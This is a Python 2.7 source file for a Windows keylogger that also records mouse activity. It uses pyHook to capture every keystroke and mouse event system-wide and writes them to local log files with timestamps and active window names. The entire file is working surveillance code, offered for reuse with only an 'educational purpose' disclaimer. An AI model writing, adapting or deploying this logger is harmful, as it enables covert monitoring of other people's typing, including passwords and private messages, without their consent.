'''
Python Keyboard + Mouse Logger for Windows
====================================
Coded By: Vikranth

MINIMUM REQUIREMENTS
===================
Python 2.7: http://www.python.org/getit/
pyHook Module: http://sourceforge.net/projects/pyhook/
pywin32 Module (pythoncom): http://sourceforge.net/projects/pywin32/

pyHook Module - 
Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/

NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
'''

import pythoncom, pyHook
import datetime,time
import os

i = 0
while os.path.exists("mouselogs%s.txt" % i):
    i += 1

fp = open("mouselogs%s.txt" % i, "a")
fp.write("Time,Message Name,WindowName,Position-X,Postion-Y,Wheel\n")
fp.close()

fp=open("keyboardlogs%s.txt" % i, "a")
fp.write("Time,Keys,WindowName,KeyID\n")
fp.close()

def OnMouseEvent(event):
    # called when mouse events are received
    
    fp=open("mouselogs%s.txt" % i, "a")
    data = str(time.time()) + ","
    #data = data + "Message:" + str(event.Message) + "\n"
    data = data + str(event.MessageName) + ","
    #data = data + "Window:" + str(event.Window) + "\n"
    data = data + str(event.WindowName) + ","
    data = data + str(event.Position) + ","
    data = data + str(event.Wheel) 
    #data = data + "Injected:" + str(event.Injected) + "\n"
    data = data + "\n" 
    fp.write(data)
    fp.close()
    '''
    print 'MessageName:',event.MessageName
    print 'Time:',event.Time
    print 'WindowName:',event.WindowName
    print 'Position:',event.Position
    print 'Wheel:',event.Wheel
    print '---'
    '''

# return True to pass the event to other handlers
    return True


def keypressed(event):
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    fp=open("keyboardlogs%s.txt" % i, "a")
    data2 = str(time.time()) + ","   #Time
    data2 = data2 + keys + ","        #Keys
    data2 = data2 + str(event.WindowName) + ","    #WindowName
    #data2 = data2 + str(event.ScanCode) + ","      #ScanCode
    data2 = data2 + str(event.KeyID)       #KeyID
    data2 = data2 + "\n"
    fp.write(data2)
    fp.close()



# create a hook manager
hm = pyHook.HookManager()
# watch for all mouse events
hm.MouseAll = OnMouseEvent
hm.KeyDown = keypressed

# set the hook
hm.HookMouse()
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
input("hi")